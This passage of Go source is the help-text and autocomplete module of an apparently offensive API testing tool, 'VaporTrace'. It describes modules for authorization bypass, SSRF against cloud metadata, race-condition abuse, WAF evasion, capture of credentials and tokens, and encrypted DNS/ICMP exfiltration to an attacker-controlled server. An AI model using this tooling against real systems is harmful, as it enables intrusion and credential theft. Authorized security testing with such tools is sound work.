			"[yellow]F7[-]          Global    REPORT tab - Findings export (Markdown/PDF)",
			"[yellow]Page Up[-]     F1 Tab    Scroll up in logs",
			"[yellow]Page Down[-]   F1 Tab    Scroll down in logs",
			"[yellow]Ctrl + W[-]    F7 Tab    Save report to disk",
			"[yellow]Ctrl + X[-]    F7 Tab    Delete session & clear report",
			"[yellow]Esc[-]         Global    Exit VaporTrace (with confirmation)",
		}
		for _, k := range keys {
			utils.TacticalLog(k)
		}

	case "tasks":
		utils.TacticalLog("Displays a real-time status list of all active VaporTrace engines.")
		utils.TacticalLog("Monitors: Context Aggregator, Neural Engine, Interceptor, and Proxy Pool.")
	case "neuro":
		utils.TacticalLog("Configures the Neural Engine.")
		utils.TacticalLog("Usage: neuro config <provider> <model> [api_key] [endpoint]")
		utils.TacticalLog("Example: neuro config ollama mistral")
		utils.TacticalLog("Example: neuro config openai gpt-4 sk-123...")
	case "neuro-gen":
		utils.TacticalLog("Uses the AI to generate a list of fuzzing payloads for a specific context.")
		utils.TacticalLog("Usage: neuro-gen <context_description> <count>")
		utils.TacticalLog("Example: neuro-gen \"SQL Injection in ID field\" 5")
	case "seed_db":
		utils.TacticalLog("Injects 20 fake vulnerabilities into the database. Useful for verifying the 'report' command without running live attacks.")
	case "bola":
		utils.TacticalLog("Attempts to access resources of other users by iterating IDs in the URL.")
		utils.TacticalLog("Pattern: /user/1 -> /user/2 -> /user/3 (detecting 200 OK when switching users)")
		utils.TacticalLog("Stores findings in Loot vault with confidence scoring.")

	case "bfla":
		utils.TacticalLog("Tests for Broken Function Level Authorization by attempting forbidden HTTP methods.")
		utils.TacticalLog("Methods tested: DELETE, PUT, PATCH, HEAD (in addition to GET/POST)")
		utils.TacticalLog("Detects privilege escalation via method override.")

	case "bopla":
		utils.TacticalLog("Mass Assignment / Broken Object Property Level Authorization.")
		utils.TacticalLog("Injects administrative properties: is_admin, role, discount, permissions, etc.")
		utils.TacticalLog("Detects if server accepts and applies injected properties.")

	case "ssrf":
		utils.TacticalLog("Injects internal IP addresses and cloud metadata URLs into parameters.")
		utils.TacticalLog("Targets: 127.0.0.1, localhost, 169.254.169.254 (AWS), 10.0.0.0/8")
		utils.TacticalLog("Detects internal service access and metadata exposure.")

	case "exhaust":
		utils.TacticalLog("Fuzzes pagination parameters with large values to test resource exhaustion.")
		utils.TacticalLog("Parameters: limit, size, page, per_page (tests with values 1000-1000000)")
		utils.TacticalLog("Detects DoS vulnerabilities and missing rate limiting.")

	case "audit":
		utils.TacticalLog("Security misconfiguration audit: Headers, SSL/TLS, CORS policies.")
		utils.TacticalLog("Checks: Missing HSTS, weak CORS, exposed server info, insecure cookies.")

	case "probe":
		utils.TacticalLog("Tests for Unsafe Consumption of untrusted input in webhooks/integrations.")
		utils.TacticalLog("Injects payloads into webhook endpoints and monitors for reflection.")

	case "pipeline":
		utils.TacticalLog("Analyzes discovered endpoints and auto-routes to appropriate attack engines.")
		utils.TacticalLog("Orchestration: Patterns detected (ID-based) -> route to BOLA, BOPLA, etc.")

	case "intruder":
		utils.TacticalLog("[cyan]INTRUDER SNIPER - Automated Fuzzing Engine[-]")
		utils.TacticalLog("Iterates through a wordlist, replacing a specific parameter value.")
		utils.TacticalLog("Automatically detects anomalies by comparing against a baseline request.")
		utils.TacticalLog("")
		utils.TacticalLog("Usage: intruder sniper <url> <param> <wordlist_path>")
		utils.TacticalLog("Example: intruder sniper https://api.target.com/user?id=1 id ./payloads/sqli.txt")
		utils.TacticalLog("")
		utils.TacticalLog("Logic:")
		utils.TacticalLog("  1. Baselines the target (normal request).")
		utils.TacticalLog("  2. Injects payloads from wordlist.")
		utils.TacticalLog("  3. Flags responses with status code changes or >10% length variation.")

	case "race":
		utils.TacticalLog("[cyan]RACE CONDITION ENGINE - TOCTOU Vulnerability Testing[-]")
		utils.TacticalLog("Detects Time-of-Check to Time-of-Use (TOCTOU) race conditions.")
		utils.TacticalLog("Uses synchronization gate pattern to execute parallel requests with nanosecond precision.")
		utils.TacticalLog("")
		utils.TacticalLog("Usage: race <url> [threads]")
		utils.TacticalLog("Example: race https://api.target.com/api/claim?code=WINNER 30")
		utils.TacticalLog("")
		utils.TacticalLog("Detection Logic:")
		utils.TacticalLog("  1. Spawns N concurrent goroutines (default: 20 threads)")
		utils.TacticalLog("  2. All threads wait on synchronization gate (channel barrier)")
		utils.TacticalLog("  3. Gate closes -> all threads fire simultaneously (nanosecond precision)")
		utils.TacticalLog("  4. Analyzes response variance (status codes, body length)")
		utils.TacticalLog("")
		utils.TacticalLog("Common Vulnerabilities Detected:")
		utils.TacticalLog("  - Coupon reuse (double spending)")
		utils.TacticalLog("  - Bypassing transfer limits")
		utils.TacticalLog("  - Creating duplicate resources")
		utils.TacticalLog("  - Gift card redemption exploits")
		utils.TacticalLog("")
		utils.TacticalLog("Severity: CRITICAL (CVSS 8.5+) - Requires architectural fixes")

	case "weaver":
		utils.TacticalLog("Deploys Ghost Weaver agent for OIDC token interception and data masking.")
		utils.TacticalLog("Useful for: OAuth 2.0 testing, SAML assertions, session hijacking.")

	case "map":
		utils.TacticalLog("Full reconnaissance: Combines swagger parsing + JS scraping + endpoint discovery.")
		utils.TacticalLog("Populates F2 map table with all discovered endpoints automatically.")

	case "scrape":
		utils.TacticalLog("Extracts potential API endpoints from JavaScript files.")
		utils.TacticalLog("Regex patterns: /api/, fetch(), axios.get, $.ajax, etc.")

	case "swagger":
		utils.TacticalLog("Parses Swagger/OpenAPI JSON specs to map API attack surface.")
		utils.TacticalLog("Extracts: Endpoints, methods, parameters, auth schemes, request/response schemas.")

	case "mine":
		utils.TacticalLog("[cyan]PARAMETER MINING - HIDDEN PARAMETER DISCOVERY[-]")
		utils.TacticalLog("Fuzzes an endpoint for hidden query parameters (debug, admin, test, secret, etc).")
		utils.TacticalLog("Tests 100 common parameter names to reveal hidden functionality.")
		utils.TacticalLog("")
		utils.TacticalLog("Usage: mine <url> [endpoint]")
		utils.TacticalLog("Example: mine https://api.example.com /api/users")
		utils.TacticalLog("")
		utils.TacticalLog("Detection:")
		utils.TacticalLog("  - Response size anomalies")
		utils.TacticalLog("  - Status code changes (e.g., 200 vs 400)")
		utils.TacticalLog("  - Debug parameters revealing internal state")

	case "spider":
		utils.TacticalLog("[cyan]ACTIVE RECONNAISSANCE SPIDER (Web Crawler)[-]")
		utils.TacticalLog("Recursively crawl target domain to build the attack surface map.")
		utils.TacticalLog("Behavior:")
		utils.TacticalLog("  - Scopes to the target domain (will not crawl external sites).")
		utils.TacticalLog("  - Extracts 'href' and 'src' attributes from HTML/JS.")
		utils.TacticalLog("  - Automatically adds findings to Global Discovery (F2) and Database.")
		utils.TacticalLog("  - Respects 'stealth' settings (User-Agent rotation, delays, jitter).")
		utils.TacticalLog("  - Rate limiting with semaphore (max 10 concurrent).")
		utils.TacticalLog("")
		utils.TacticalLog("Usage: spider <url> [depth]")
		utils.TacticalLog("Example: spider https://httpbin.org 3")
		utils.TacticalLog("")
		utils.TacticalLog("Output:")
		utils.TacticalLog("  - F2 Map tab: All discovered endpoints with status codes")
		utils.TacticalLog("  - F1 Log: Real-time crawl progress and findings")
		utils.TacticalLog("  - Database: All URLs stored for reporting")
		utils.TacticalLog("")
		utils.TacticalLog("Pro Tip: Run 'stealth silent' before spider for WAF-protected targets")

	case "fuzz":
		utils.TacticalLog("[cyan]BRUTE-FORCE DISCOVERY WITH ANOMALY DETECTION[-]")
		utils.TacticalLog("Fuzz endpoints for hidden paths and parameters using embedded wordlists.")
		utils.TacticalLog("")
		utils.TacticalLog("Modes:")
		utils.TacticalLog("  [yellow]params[-]  - Fuzz query parameters (100 common names)")
		utils.TacticalLog("             Detection: Status code anomaly, response size delta > 100 bytes")
		utils.TacticalLog("  [yellow]paths[-]   - Fuzz hidden paths (100 common administrative routes)")
		utils.TacticalLog("             Detection: Any status other than 404")
		utils.TacticalLog("")
		utils.TacticalLog("Usage: fuzz <url> [params|paths]")
		utils.TacticalLog("Examples:")
		utils.TacticalLog("  fuzz https://api.example.com/v1/users params    (Find hidden query params)")
		utils.TacticalLog("  fuzz https://example.com paths                  (Find admin panels, configs, etc)")
		utils.TacticalLog("")
		utils.TacticalLog("Concurrency: 5 workers (configurable via --threads flag)")
		utils.TacticalLog("")
		utils.TacticalLog("Output:")
		utils.TacticalLog("  - F2 Map: New endpoints automatically added")
		utils.TacticalLog("  - F1 Log: Real-time discovery with status codes")
		utils.TacticalLog("  - Database: Findings recorded with confidence scoring")

	case "target":
		utils.TacticalLog("Set the global context URL for all modules.")
		utils.TacticalLog("Usage: target https://api.example.com")
		utils.TacticalLog("This URL becomes the base for all reconnaissance and attack operations.")

	case "sessions":
		utils.TacticalLog("Display and manage active authentication tokens and cookies.")
		utils.TacticalLog("Stores: JWT tokens, API keys, session cookies, auth headers.")

	case "proxy":
		utils.TacticalLog("Configure upstream proxy for all tactical traffic.")
		utils.TacticalLog("Usage: proxy 127.0.0.1:8080 (for Burp Suite)")
		utils.TacticalLog("Or: proxy <hostname>:<port> for any upstream proxy")

	case "proxies":
		utils.TacticalLog("Load and rotate through a list of proxies for bypass/load distribution.")
		utils.TacticalLog("Usage: proxies load <file>  - Load proxy list from file")
		utils.TacticalLog("Useful for: Rate limit bypass, GeoIP testing, load balancing.")

	case "loot":
		utils.TacticalLog("Manage the Discovery Vault (captures secrets from responses).")
		utils.TacticalLog("Captured: JWT tokens, API keys, AWS credentials, database credentials, etc.")
		utils.TacticalLog("View in F3 Loot table with confidence scoring and source tracking.")

	case "init_db":
		utils.TacticalLog("Initialize SQLite3 backend database (first run only).")
		utils.TacticalLog("Creates tables for: Findings, Endpoints, Loot, Sessions, Context.")

	case "seed_db":
		utils.TacticalLog("Inject 20 fake vulnerabilities for demo/testing purposes.")
		utils.TacticalLog("Useful for: Testing report generation, UI verification, without live attacks.")

	case "reset_db":
		utils.TacticalLog("Purge all mission data from the database (irreversible).")
		utils.TacticalLog("Clears: Findings, endpoints, loot, contexts - everything.")

	case "report":
		utils.TacticalLog("Generate comprehensive security report (Markdown/PDF) from findings.")
		utils.TacticalLog("Engine: 9.13 Report Generator (aggregates all loot, actions, findings)")

	case "clear":
		utils.TacticalLog("Clear the F1 tactical feed (log viewer).")
		utils.TacticalLog("Data is not deleted, just the display is cleared for readability.")

	case "usage":
		utils.TacticalLog("Display all available commands organized by category.")
		utils.TacticalLog("Usage: usage     - Show page 1 (Strategic Planning & Discovery)")
		utils.TacticalLog("Usage: usage 2   - Show page 2 (Evasion, AI, Infrastructure & System)")
		utils.TacticalLog("[cyan]📖 For detailed help on any command, run: help <command>[-]")

	case "reconnaissance":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/05_RECONNAISSANCE.md[-]")
		utils.TacticalLog("Advanced API discovery, endpoint mapping, parameter mining and Swagger parsing.")
		utils.TacticalLog("Topics: Target management, spidering, JavaScript extraction, behavioral analysis")

	case "exploitation":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/06_EXPLOITATION.md[-]")
		utils.TacticalLog("OWASP API Top 10 vulnerability testing: BOLA, BFLA, BOPLA, SSRF, exhaustion")
		utils.TacticalLog("Topics: Attack vectors, exploitation chains, remediation code")

	case "ai":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/07_AI_NEURO_ENGINE.md[-]")
		utils.TacticalLog("LLM-powered payload generation using Groq, OpenAI, or local Ollama.")
		utils.TacticalLog("Topics: Neural engine setup, AI configuration, payload mutation strategies")

	case "interceptor":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/08_INTERCEPTOR_MITM.md[-]")
		utils.TacticalLog("Request and response interception for real-time modification and analysis.")
		utils.TacticalLog("Topics: MITM setup, request editing, response tampering, payload injection")

	case "evasion":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/10_GHOST_WEAVER.md[-]")
		utils.TacticalLog("Advanced WAF/IDS evasion techniques including payload obfuscation.")
		utils.TacticalLog("Topics: Token forgery, data masking, behavioral evasion, detection avoidance")

	case "config":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/15_CONFIGURATION.md[-]")
		utils.TacticalLog("Advanced configuration, environment variables, and performance tuning.")
		utils.TacticalLog("Topics: Config files, target-specific settings, batch sizes, connection pooling")

	case "troubleshoot":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/16_TROUBLESHOOTING.md[-]")
		utils.TacticalLog("Common issues, diagnosis trees, and solutions for VaporTrace problems.")
		utils.TacticalLog("Topics: Timeouts, SSL errors, WAF detection, performance optimization")

	case "faq":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/20_FAQ_TIPS.md[-]")
		utils.TacticalLog("Frequently asked questions, best practices, and legal compliance information.")
		utils.TacticalLog("Topics: Installation, authentication, evasion, licensing, security")

	case "stealth":
		utils.TacticalLog("[cyan]STEALTH MODE MANAGEMENT[-]")
		utils.TacticalLog("Set global evasion strategy with preset modes.")
		utils.TacticalLog("Usage: stealth <mode>")
		utils.TacticalLog("Modes:")
		utils.TacticalLog("  [yellow]aggressive[-]  - Fast with minimal delays (1.0x multiplier)")
		utils.TacticalLog("  [yellow]fast[-]        - Balanced speed and stealth (1.5x multiplier)")
		utils.TacticalLog("  [yellow]silent[-]      - Maximum obfuscation (3.0x multiplier, all features ON)")
		utils.TacticalLog("  [yellow]debug[-]       - Verbose logging of evasion techniques")
		utils.TacticalLog("  [yellow]off[-]         - Kill switch: Disable ALL evasion (fastest mode)")

	case "stealth off":
		utils.TacticalLog("[cyan]STEALTH OFF - Kill Switch[-]")
		utils.TacticalLog("Disable all evasion techniques immediately.")
		utils.TacticalLog("Usage: stealth off")
		utils.TacticalLog("Effect:")
		utils.TacticalLog("  • Disables: Jitter, Thinking, Backoff, Obfuscation, Encoding")
		utils.TacticalLog("  • Multiplier reset to 1.0x")
		utils.TacticalLog("  • Running in maximum speed/aggression mode")
		utils.TacticalLog("Useful for: Speed testing, aggressive probing, network-friendly environments")
		utils.TacticalLog("Warning: No evasion = higher detection risk on WAF-protected targets")

	case "stealth status":
		utils.TacticalLog("Display current evasion configuration and multiplier.")
		utils.TacticalLog("Shows: All 5 evasion toggles (ON/OFF) + current mode + global delay multiplier")
		utils.TacticalLog("Useful for: Verifying evasion state before executing attacks")

	case "stealth toggle":
		utils.TacticalLog("Enable or disable individual evasion techniques.")
		utils.TacticalLog("Usage: stealth toggle <feature> <on|off>")
		utils.TacticalLog("Features:")
		utils.TacticalLog("  [yellow]jitter[-]       - Random variance in request timing (Gaussian distribution)")
		utils.TacticalLog("  [yellow]thinking[-]     - Contextual delays (GET: 10-50ms, POST: 800-3000ms)")
		utils.TacticalLog("  [yellow]backoff[-]      - Exponential backoff on rate limits (429 responses)")
		utils.TacticalLog("  [yellow]obfuscation[-]  - Path/parameter noise injection")
		utils.TacticalLog("  [yellow]encoding[-]     - Payload encoding (gzip, deflate, whitespace)")

	case "stealth multiplier":
		utils.TacticalLog("Scale all evasion delay timings globally.")
		utils.TacticalLog("Usage: stealth multiplier <0.1-5.0>")
		utils.TacticalLog("Examples:")
		utils.TacticalLog("  [yellow]0.1x[-]  - 10% of normal delays (speed over stealth)")
		utils.TacticalLog("  [yellow]1.0x[-]  - Default timings (balanced)")
		utils.TacticalLog("  [yellow]5.0x[-]  - 500% delays (maximum stealth for WAF-heavy targets)")
		utils.TacticalLog("Useful for: Tuning WAF evasion per-target based on detection feedback")

	case "evasion techniques":
		utils.TacticalLog("[cyan]EVASION TECHNIQUE REFERENCE[-]")
		utils.TacticalLog("Learn about individual evasion techniques deployed by VaporTrace.")
		utils.TacticalLog("Usage: evasion <technique> | evasion status")
		utils.TacticalLog("Techniques:")
		utils.TacticalLog("  [yellow]thinking[-]     - Request-type specific delays (GET faster than POST)")
		utils.TacticalLog("  [yellow]jitter[-]       - Temporal variance using Gaussian distribution")
		utils.TacticalLog("  [yellow]backoff[-]      - Rate limit handling with exponential backoff")
		utils.TacticalLog("  [yellow]obfuscation[-]  - Cache busters, path parameters, double encoding")
		utils.TacticalLog("  [yellow]encoding[-]     - Payload transforms (gzip, deflate, Base64)")
		utils.TacticalLog("  [yellow]oob[-]          - OOB exfiltration via AES-256-GCM channels")
		utils.TacticalLog("Use 'evasion status' to see all currently active techniques")

	case "waf detect":
		utils.TacticalLog("[cyan]WAF DETECTION ENGINE[-]")
		utils.TacticalLog("Monitor and display WAF detection patterns in real-time.")
		utils.TacticalLog("Monitored Indicators:")
		utils.TacticalLog("  [yellow]429[-] Rate Limit    - Too many requests")
		utils.TacticalLog("  [yellow]403[-] WAF Block     - Explicit WAF rejection")
		utils.TacticalLog("  [yellow]Redirects[-]        - Honeypot or WAF honey-trap")
		utils.TacticalLog("  [yellow]500 Errors[-]       - Signature-based injection detection")
		utils.TacticalLog("Recommendation: Use 'stealth silent' mode for WAF-protected targets")
		// FIXED: Add actual WAF detection stats from findings with safe type assertions
		wafStats := logic.GetWAFDetectionStats()
		if wafStats != nil {
			utils.TacticalLog("[green]WAF Detection Statistics:[-]")
			if rlCount, ok := wafStats["rate_limit_blocks"].(int); ok {
				utils.TacticalLog(fmt.Sprintf("  Rate Limit (429): %d blocks", rlCount))
			}
			if wafCount, ok := wafStats["waf_blocks"].(int); ok {
				utils.TacticalLog(fmt.Sprintf("  WAF Blocks (403): %d blocks", wafCount))
			}
			if redirects, ok := wafStats["redirects"].(int); ok {
				utils.TacticalLog(fmt.Sprintf("  Redirects (30x): %d redirects", redirects))
			}
			if errors, ok := wafStats["server_errors"].(int); ok {
				utils.TacticalLog(fmt.Sprintf("  Server Errors (50x): %d errors", errors))
			}
			if detected, ok := wafStats["detected"].(bool); ok && detected {
				utils.TacticalLog("[red]⚠ WAF/IDS DETECTED[-] Recommend switching to 'stealth silent' mode")
			} else {
				utils.TacticalLog("[green]✓ No active WAF detection patterns observed[-]")
			}
		}
		utils.TacticalLog("Tip: Use 'loot list' to see captured WAF responses")

	case "oob":
		utils.TacticalLog("[cyan]OOB EXFILTRATION CHANNEL[-]")
		utils.TacticalLog("Manage encrypted out-of-band data exfiltration channels.")
		utils.TacticalLog("Deployment: Automatically activated when findings are queued for exfil.")
		utils.TacticalLog("Encryption: [green]AES-256-GCM[-] authenticated encryption on all payloads.")
		utils.TacticalLog("Channels:")
		utils.TacticalLog("  [yellow]TCP[-]               - Custom TCP protocol to OOB receiver")
		utils.TacticalLog("  [yellow]DNS[-]               - DNS tunneling (covert subdomain encoding)")
		utils.TacticalLog("  [yellow]ICMP[-]              - ICMP echo tunneling (firewall evasion)")
		utils.TacticalLog("Usage:")
		utils.TacticalLog("  oob config <channel>  - Configure exfiltration endpoint")
		utils.TacticalLog("  oob status            - Show current channel status")
		utils.TacticalLog("Typical Workflow:")
		utils.TacticalLog("  1. Capture sensitive data (JWT, API keys, DB creds) in Loot Vault")
		utils.TacticalLog("  2. OOB channel auto-queues findings for encrypted transmission")
		utils.TacticalLog("  3. Receiver (attacker-controlled) decrypts payload on exfil server")
		utils.TacticalLog("Integration: Works seamlessly with SSRF, BOLA, and other attack vectors")

	case "exit":
		utils.TacticalLog("Gracefully shutdown VaporTrace with sequential cleanup:")
		utils.TacticalLog("  1. Terminate network stacks")
		utils.TacticalLog("  2. Close database and sync")
		utils.TacticalLog("  3. Purge Ghost-Weaver agents")
		utils.TacticalLog("  4. Cleanup temporary files")

	default:
		utils.TacticalLog("No specific manual entry found. Try 'usage' for a list of commands.")
		utils.TacticalLog("[cyan]📖 Available manual topics: reconnaissance | exploitation | ai | interceptor | evasion | config | troubleshoot | faq[-]")
		utils.TacticalLog("Try 'help keys' for keyboard hotkeys and UI controls.")
	}
}

func shortToken(t string) string {
	if len(t) > 10 {
		return t[:10]
	}
	return t
}

// GetAvailableCommands returns all available commands for autocomplete and help
func GetAvailableCommands() []string {
	return []string{
		// Strategic Planning
		"analyze", "list-plan", "edit", "drop", "commit", "remediate",
		// Reconnaissance & Discovery
		"target", "map", "spider", "swagger", "scrape", "mine", "fuzz",
		"sessions", "pipeline",
		// Exploitation
		"bola", "bfla", "bopla", "ssrf", "exhaust", "audit", "probe", "flow", "intruder", "race",
		// Neural Engine
		"ask", "neuro", "neuro-gen", "test-neuro",
		// Identity & Sessions
		"auth",
		// Stealth & Evasion
		"stealth", "evasion", "waf", "oob",
		// Data & Persistence
		"loot", "proxy", "proxies", "init_db", "seed_db", "reset_db", "report",
		// System
		"tasks", "clear", "usage", "help", "keys", "exit",
		// Advanced
		"weaver", "test-neuro",
	}
}

// AutocompleteCommand provides command suggestions based on partial input
func AutocompleteCommand(prefix string) []string {
	commands := GetAvailableCommands()
	var suggestions []string
	prefix = strings.ToLower(prefix)

	for _, cmd := range commands {
		if strings.HasPrefix(cmd, prefix) {
			suggestions = append(suggestions, cmd)
		}
	}

	return suggestions
}

// GetCommandSyntax returns the full syntax help for a command
func GetCommandSyntax(cmd string) string {
	syntaxMap := map[string]string{
		"analyze":    "analyze",
		"list-plan":  "list-plan",
		"edit":       "edit <action_id> <new_payload>",
		"drop":       "drop <action_id>",
		"commit":     "commit",
		"remediate":  "remediate <BOLA|SSRF|SQLI|BFLA>",
		"target":     "target <url>",
		"map":        "map [url]",
		"spider":     "spider <url> [depth]",
		"swagger":    "swagger <url>",
		"scrape":     "scrape <js_url>",
		"mine":       "mine <url> [endpoint]",
		"fuzz":       "fuzz <url> [params|paths]",
		"bola":       "bola <url> [victim_id] OR bola --pipeline",
		"bfla":       "bfla [url]",
		"bopla":      "bopla [url]",
		"ssrf":       "ssrf <url> <param> [callback]",
		"exhaust":    "exhaust <url> <param>",
		"audit":      "audit <url>",
		"probe":      "probe <url>",
		"flow":       "flow <list|clear|run|race>",
		"race":       "race <url> [threads]",
		"ask":        "ask <your_question>",
		"neuro":      "neuro <on|off|config <provider> <model>>",
		"neuro-gen":  "neuro-gen <context> <count>",
		"test-neuro": "test-neuro",
		"auth":       "auth <attacker|victim> <token>",
		"sessions":   "sessions",
		"stealth":    "stealth <mode|status|toggle|multiplier|off>",
		"evasion":    "evasion <technique> | evasion status",
		"waf":        "waf detect",
		"oob":        "oob [config|status]",
		"loot":       "loot [list|clear]",
		"proxy":      "proxy <host:port>",
		"proxies":    "proxies load <file>",
		"init_db":    "init_db",
		"seed_db":    "seed_db",
		"reset_db":   "reset_db",
		"report":     "report",
		"tasks":      "tasks",
		"clear":      "clear",
		"usage":      "usage [1|2]",
		"help":       "help <command>",
		"keys":       "help keys",
		"exit":       "exit",
		"weaver":     "weaver [enable|disable|status]",
		"pipeline":   "pipeline",
	}

	if syntax, ok := syntaxMap[strings.ToLower(cmd)]; ok {
		return syntax
	}
	return ""
}
